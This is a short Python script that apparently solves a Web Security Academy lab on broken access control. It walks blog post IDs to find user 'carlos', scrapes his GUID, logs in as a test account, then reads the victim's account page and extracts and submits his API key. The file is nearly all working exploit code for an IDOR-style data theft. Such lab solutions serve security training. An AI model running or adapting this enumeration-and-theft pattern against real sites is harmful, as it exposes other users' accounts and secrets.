# usage:
# python3 4.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --w carlos

import re
from argparse import ArgumentParser

import requests


def solve(url: str, who: str) -> None:
    s = requests.Session()
    url = url.rstrip("/")
    post_url = f"{url}/post?postId="
    login_url = f"{url}/login"
    submission_url = f"{url}/submitSolution"

    i = 0
    userId = None
    while not userId:
        r = s.get(post_url + str(i))
        if r.status_code == 200:
            if who in r.text:
                userId = re.findall(r"userId=(\w+\-\w+\-\w+\-\w+\-\w+)", r.text)[0]

        i += 1

    r = s.get(login_url)
    csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
    r = s.post(
        login_url,
        data={
            "csrf": csrf,
            "username": "wiener",
            "password": "peter",
        },
    )

    account_url = f"{url}/my-account?id={userId}"

    r = s.get(account_url)
    api_key = re.findall(r"Your API Key is: (\w+)", r.text)[0]
    r = s.post(
        submission_url,
        data={
            "answer": api_key,
        },
    )


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    solve(args.url, args.who)


if __name__ == "__main__":
    main()
